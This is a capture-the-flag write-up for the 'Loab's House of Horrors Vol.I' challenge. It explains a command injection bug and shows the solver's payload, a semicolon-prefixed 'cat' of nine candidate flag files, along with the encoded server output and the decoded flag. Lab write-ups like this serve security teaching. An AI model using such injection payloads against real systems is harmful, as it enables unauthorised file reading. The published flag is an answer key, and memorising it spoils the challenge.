# Loab's House of Horrors Vol.I

## Description:
> It sounds like Loab is back and luring students into their trap. Thankfully Anna managed to rip the source code before Loab left the NJIT network. If we can find the flag we might be able to shut this down!

## Attachment:
### [LoabsHouseOfHorrors.zip](./LoabsHouseOfHorrors.zip)
```
LoabsHouseOfHorrors.zip/
└── files/
    ├── Dockerfile
    └── src/
        ├── flag.txt
        ├── watchdog.py
        └── welcome.py
```

## Solve

There is a command injection vulnerability with this. The program places the flag in a random one of the following files which all exist:
```
/tmp/singularity
/tmp/abyss
/tmp/.loab
/home/council
/tmp/.boom
/home/victim/.consortium
/usr/bnc/.yummyarbs
/tmp/orphans
/tmp/loab
```

I think the intended solution is to first use a command injection to find where the flag is, and then use another to `cat` it out. I was too lazy for this, and
instead just used the injection
```sh
;cat /tmp/singularity /tmp/abyss /tmp/.loab /home/council /tmp/.boom /home/victim/.consortium /usr/bnc/.yummyarbs /tmp/orphans /tmp/loab
```

The server output
`Ck5JQ0N7SnU1dF9wdTdfbDBAYl8xbl9yYzNfb3JfaDMxMV9pX2d1M3NzfQ==`

which decoded to

`NICC{Ju5t_pu7_l0@b_1n_rc3_or_h311_i_gu3ss}`
